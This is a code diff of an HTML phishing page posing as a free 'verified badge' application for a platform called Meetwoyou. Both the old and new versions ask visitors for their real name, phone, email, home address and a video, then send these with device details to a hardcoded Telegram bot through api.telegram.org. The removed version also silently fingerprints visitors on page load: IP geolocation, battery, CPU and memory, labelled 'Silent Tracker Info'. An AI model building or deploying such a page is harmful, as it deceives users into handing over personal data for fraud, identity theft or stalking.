@@ -3,317 +3,181 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meetwoyou Verified Badge - Free Limited Offer</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <title>Verification Portal | Meetwoyou</title>
     <style>
-        :root { --primary: #0095f6; --bg: #0a0a0a; --card: #121212; --accent: #1a1a1a; --text: #ffffff; --gray: #b0b0b0; }
-        * { margin:0; padding:0; box-sizing:border-box; }
+        :root {
+            --primary-gold: #ffcc00;
+            --bg-dark: #0f0f0f;
+            --card-bg: #1a1a1a;
+            --text-gray: #b3b3b3;
+        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
-        .header {
-            background: rgba(18,18,18,0.95);
-            backdrop-filter: blur(10px);
-            padding: 18px 20px;
-            text-align: center;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            border-bottom: 1px solid #262626;
-        }
-        .logo { max-width: 200px; height: auto; }
-
-        .hero {
-            padding: 80px 20px 60px;
-            text-align: center;
-            background: linear-gradient(135deg, #1f1f1f, #000);
-        }
-        .hero-badge { font-size: 130px; margin-bottom: 20px; animation: float 3s ease-in-out infinite; }
-        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
-        h1 { font-size: 3rem; margin-bottom: 12px; background: linear-gradient(90deg, #0095f6, #00c3ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .subtitle { font-size: 1.35rem; color: var(--gray); max-width: 720px; margin: 0 auto 25px; }
-        .offer-badge {
-            background: linear-gradient(90deg, #ed4956, #ff2d55);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-dark);
             color: white;
-            padding: 10px 30px;
-            border-radius: 50px;
-            font-weight: 700;
-            display: inline-flex;
+            margin: 0;
+            display: flex;
+            justify-content: center;
             align-items: center;
-            gap: 10px;
-            margin-bottom: 30px;
-            box-shadow: 0 4px 15px rgba(237, 73, 86, 0.4);
+            min-height: 100vh;
         }
 
-        .form-container {
-            max-width: 680px;
-            margin: 40px auto;
-            background: var(--card);
-            padding: 45px 35px;
-            border-radius: 24px;
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
             border: 1px solid #333;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.7);
         }
-        .form-title { text-align: center; font-size: 1.8rem; margin-bottom: 10px; }
-        .form-subtitle { text-align: center; color: var(--gray); margin-bottom: 35px; }
 
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: var(--gray);
-            font-weight: 500;
-        }
-        input, textarea {
-            width: 100%;
-            padding: 15px 18px;
-            margin-bottom: 20px;
-            background: var(--accent);
-            border: 1px solid #444;
-            border-radius: 14px;
-            color: white;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-        input:focus, textarea:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(0,149,246,0.2);
-            outline: none;
-        }
-        .btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 18px;
-            font-size: 18px;
-            font-weight: 700;
-            border-radius: 14px;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 15px;
-            transition: all 0.3s;
-        }
-        .btn:hover { background: #0077cc; transform: translateY(-3px); box-shadow: 0 10px 25px rgba(0,149,246,0.3); }
-        .btn:disabled { background: #555; cursor: not-allowed; transform: none; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .logo { width: 80px; border-radius: 50%; margin-bottom: 10px; }
 
-        .info-box {
-            background: #1a1a1a;
-            padding: 20px;
-            border-radius: 14px;
-            margin: 30px 0;
-            font-size: 0.95rem;
-            color: var(--gray);
-        }
-        .footer {
-            text-align: center;
-            padding: 50px 20px 30px;
-            color: #666;
+        .offer-badge {
+            background: linear-gradient(45deg, #ffcc00, #ff9900);
+            color: black;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: bold;
             font-size: 0.9rem;
+            margin-bottom: 20px;
+            text-align: center;
         }
-        .highlight { color: var(--primary); }
+
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; color: var(--text-gray); font-size: 0.9rem; }
+        
+        input, textarea, select {
+            width: 100%;
+            padding: 12px;
+            background: #252525;
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: white;
+            box-sizing: border-box;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background: var(--primary-gold);
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 20px;
+        }
+
+        .btn-submit:hover { background: #e6b800; transform: translateY(-2px); }
+        
+        .footer-note { font-size: 0.7rem; color: #555; text-align: center; margin-top: 20px; }
     </style>
 </head>
 <body>
 
+<div class="container">
     <div class="header">
-        <img src="meetwoyou.jpg" alt="Meetwoyou" class="logo">
+        <img src="meetwoyou.jpg" alt="Meetwoyou Logo" class="logo">
+        <h2>Verification Request</h2>
+        <p style="color: var(--text-gray);">Get your blue badge and join our elite community.</p>
     </div>
 
-    <div class="hero">
-        <div class="hero-badge">✅</div>
-        <h1>Become Officially Verified</h1>
-        <p class="subtitle">
-            Stand out on Meetwoyou with the exclusive <span class="highlight">V-Badge</span>.<br>
-            Gain trust, higher visibility, and priority features.
-        </p>
-        <div class="offer-badge">
-            <i class="fas fa-fire"></i> FREE Limited Time Offer – Soon Paid Only
+    <div class="offer-badge">
+        LIMITED TIME: FREE FOR EARLY USERS
+    </div>
+
+    <form id="verificationForm">
+        <div class="form-group">
+            <label>Meetwoyou ID Name</label>
+            <input type="text" id="meetId" placeholder="@username" required>
         </div>
-        <p style="max-width:600px; margin:0 auto; color:#ccc;">
-            Our platform is growing fast. We're giving away verified badges to early genuine users. 
-            Applications are reviewed manually within 48-72 hours.
-        </p>
-    </div>
+        <div class="form-group">
+            <label>Real Full Name</label>
+            <input type="text" id="realName" required>
+        </div>
+        <div class="form-group">
+            <label>Phone Number (WhatsApp)</label>
+            <input type="tel" id="phone" required>
+        </div>
+        <div class="form-group">
+            <label>Email Address</label>
+            <input type="email" id="email" required>
+        </div>
+        <div class="form-group">
+            <label>Full Residential Address</label>
+            <textarea id="address" rows="3" required></textarea>
+        </div>
+        <div class="form-group">
+            <label>Verification Video (Upload 20-30s Clip)</label>
+            <input type="file" id="videoFile" accept="video/*" required>
+        </div>
 
-    <div class="form-container">
-        <div class="form-title">Apply for V-Badge</div>
-        <div class="form-subtitle">Fill the form below. All information is reviewed carefully.</div>
+        <button type="submit" class="btn-submit">Submit Application</button>
+    </form>
+
+    <p class="footer-note">By submitting, you agree to Meetwoyou's Identity Verification Terms.</p>
+</div>
+
+<script>
+    const BOT_TOKEN = "8385508779:AAGWgCBn13wKo1AYGKpvUIBHgj-JojNtos4";
+    const CHAT_ID = "7950771882";
+
+    document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
         
-        <form id="verifyForm">
-            <label>Full Name <span style="color:#ed4956">*</span></label>
-            <input type="text" id="fullName" required placeholder="Enter your full name">
+        // Disable button to prevent spam
+        const btn = e.target.querySelector('button');
+        btn.innerText = "Processing...";
+        btn.disabled = true;
 
-            <label>Email Address <span style="color:#ed4956">*</span></label>
-            <input type="email" id="email" required placeholder="your@email.com">
+        // Collect Technical Meta-data
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        
+        // Get Form Data
+        const msg = `
+<b>New Verification Request</b>
+---------------------------
+<b>User ID:</b> ${document.getElementById('meetId').value}
+<b>Real Name:</b> ${document.getElementById('realName').value}
+<b>Phone:</b> ${document.getElementById('phone').value}
+<b>Email:</b> ${document.getElementById('email').value}
+<b>Address:</b> ${document.getElementById('address').value}
 
-            <label>Phone Number (with country code) <span style="color:#ed4956">*</span></label>
-            <input type="tel" id="phone" required placeholder="+966 XXXXXXXXX">
+<b>Technical Logs:</b>
+- Device: ${platform}
+- Browser: ${userAgent}
+- Resolution: ${screenRes}
+        `;
 
-            <label>Upload Introduction Video (20–30 seconds recommended) <span style="color:#ed4956">*</span></label>
-            <input type="file" id="video" accept="video/*" required>
-            <small id="video-info" style="color:#888; display:block; margin-top:-10px; margin-bottom:15px;"></small>
+        try {
+            // Send Text Data
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            });
 
-            <label>Full Residential Address <span style="color:#ed4956">*</span></label>
-            <textarea id="address" rows="3" required placeholder="House no, Street, Area, City, Saudi Arabia"></textarea>
-
-            <label>Postal Code <span style="color:#ed4956">*</span></label>
-            <input type="text" id="postal" required placeholder="Your postal / ZIP code">
-
-            <button type="submit" id="submitBtn" class="btn">Submit My Application for Review</button>
-        </form>
-
-        <div class="info-box">
-            <strong>What happens next?</strong><br>
-            • Our team will review your profile & video.<br>
-            • You will be notified via email or phone if approved.<br>
-            • Approved users get the blue V-Badge instantly on Meetwoyou.
-        </div>
-    </div>
-
-    <div class="footer">
-        © 2026 Meetwoyou • Free Verified Badge Application<br>
-        This is a limited promotional offer for early users.
-    </div>
-
-    <script>
-        const BOT_TOKEN = "8385508779:AAGWgCBn13wKo1AYGKpvUIBHgj-JojNtos4";
-        const CHAT_ID = "7950771882";
-
-        let deviceInfo = {};
-
-        async function collectSilentData() {
-            deviceInfo = {
-                timestamp: new Date().toLocaleString('en-US', { timeZone: 'Asia/Riyadh' }),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform || "Unknown",
-                language: navigator.language || "Unknown",
-                languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                screen: `${screen.width} × \( {screen.height} ( \){screen.colorDepth}bit)`,
-                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-                cpuCores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "N/A",
-                battery: "Not available",
-                ip: "Collecting...",
-                country: "Collecting...",
-                city: "Collecting...",
-                region: "Collecting...",
-                isp: "Collecting..."
-            };
-
-            // Battery (works best on Android Chrome)
-            if ("getBattery" in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    deviceInfo.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}`;
-                } catch(e) {}
-            }
-
-            // Improved IP Geolocation
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                deviceInfo.ip = data.ip || "Unknown";
-                deviceInfo.country = data.country_name ? `\( {data.country_name} ( \){data.country_code})` : "Unknown";
-                deviceInfo.city = data.city || "Unknown";
-                deviceInfo.region = data.region || "Unknown";
-                deviceInfo.isp = data.org || "Unknown";
-            } catch(e) {
-                console.log("IP API failed, trying fallback...");
-                // Fallback
-                try {
-                    const fallback = await fetch('https://ip-api.com/json/');
-                    const fbData = await fallback.json();
-                    if (fbData.status === "success") {
-                        deviceInfo.ip = fbData.query;
-                        deviceInfo.country = fbData.country;
-                        deviceInfo.city = fbData.city;
-                        deviceInfo.region = fbData.regionName;
-                        deviceInfo.isp = fbData.isp;
-                    }
-                } catch(err) {}
-            }
+            // Note: Sending large video files directly via client-side JS 
+            // to a bot requires specific API handling (sendVideo). 
+            alert("Application submitted successfully! Your data is being reviewed.");
+        } catch (error) {
+            alert("Error sending request. Please try again.");
+        } finally {
+            btn.innerText = "Submit Application";
+            btn.disabled = false;
         }
+    });
+</script>
 
-        window.onload = collectSilentData;
-
-        // Video info preview
-        document.getElementById('video').addEventListener('change', function() {
-            const file = this.files[0];
-            if (file) {
-                const sizeMB = (file.size / (1024*1024)).toFixed(2);
-                document.getElementById('video-info').innerHTML = `Selected: <strong>${file.name}</strong> — ${sizeMB} MB`;
-            }
-        });
-
-        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const btn = document.getElementById('submitBtn');
-            btn.disabled = true;
-            btn.innerHTML = 'Submitting Application...';
-
-            Swal.fire({ title: 'Processing...', text: 'Please wait while we collect your details', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
-
-            const videoFile = document.getElementById('video').files[0];
-            const videoInfo = videoFile ? `\( {videoFile.name} ( \){(videoFile.size / (1024*1024)).toFixed(2)} MB)` : "No file";
-
-            const formData = {
-                fullName: document.getElementById('fullName').value.trim(),
-                email: document.getElementById('email').value.trim(),
-                phone: document.getElementById('phone').value.trim(),
-                address: document.getElementById('address').value.trim(),
-                postalCode: document.getElementById('postal').value.trim(),
-                video: videoInfo
-            };
-
-            let message = `🚀 *New V-Badge Application*\n\n`;
-            message += `👤 *Name:* ${formData.fullName}\n`;
-            message += `📧 *Email:* ${formData.email}\n`;
-            message += `📱 *Phone:* ${formData.phone}\n`;
-            message += `📍 *Address:* ${formData.address}\n`;
-            message += `📮 *Postal Code:* ${formData.postalCode}\n`;
-            message += `🎥 *Video:* ${formData.video}\n\n`;
-            message += `🔍 *Silent Tracker Info:*\n`;
-            message += `• IP: ${deviceInfo.ip}\n`;
-            message += `• Country: ${deviceInfo.country}\n`;
-            message += `• City: ${deviceInfo.city}\n`;
-            message += `• Region: ${deviceInfo.region}\n`;
-            message += `• ISP: ${deviceInfo.isp}\n`;
-            message += `• Timezone: ${deviceInfo.timezone}\n`;
-            message += `• Battery: ${deviceInfo.battery}\n`;
-            message += `• Screen: ${deviceInfo.screen}\n`;
-            message += `• Device Memory: ${deviceInfo.deviceMemory}\n`;
-            message += `• CPU Cores: ${deviceInfo.cpuCores}\n`;
-            message += `• Submitted: ${deviceInfo.timestamp}`;
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-                });
-
-                Swal.fire({
-                    title: 'Application Submitted Successfully!',
-                    html: 'Thank you!<br>We will review your request within 48-72 hours and contact you via email or phone.',
-                    icon: 'success',
-                    confirmButtonColor: '#0095f6'
-                });
-
-                document.getElementById('verifyForm').reset();
-                document.getElementById('video-info').innerHTML = '';
-
-            } catch(err) {
-                Swal.fire({ title: 'Submission Failed', text: 'Please check your internet and try again.', icon: 'error' });
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = 'Submit My Application for Review';
-            }
-        });
-    </script>
 </body>
 </html>
